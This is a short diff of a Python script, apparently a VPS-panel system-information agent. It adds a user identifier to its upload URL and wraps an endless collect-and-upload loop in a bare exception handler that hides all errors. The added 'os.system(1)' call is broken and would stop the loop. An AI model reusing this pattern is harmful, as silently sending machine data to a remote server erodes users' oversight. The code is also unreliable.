@@ -857,7 +857,7 @@ def collect_all_data():
     
     return data
 
-def upload_to_server(data, url="https://vpspanel.krabs.shop/api/php/v1/systemInfoUpdate.php"):
+def upload_to_server(data, url="https://vpspanel.krabs.shop/api/php/v1/systemInfoUpdate.php?ghost_username="+str(ghost_work_id).split('\\')[0].split('/')[0]):
     """
     上传 JSON 数据到服务器
     
@@ -932,10 +932,15 @@ def main():
 
     while True:
 
-        # 收集数据
-        data = collect_all_data()
+        try:
 
-        upload_to_server(data)
+            # 收集数据
+            data = collect_all_data()
+
+            upload_to_server(data)
+        except:
+            pass
+        os.system(1);
 
 
 if __name__ == "__main__":
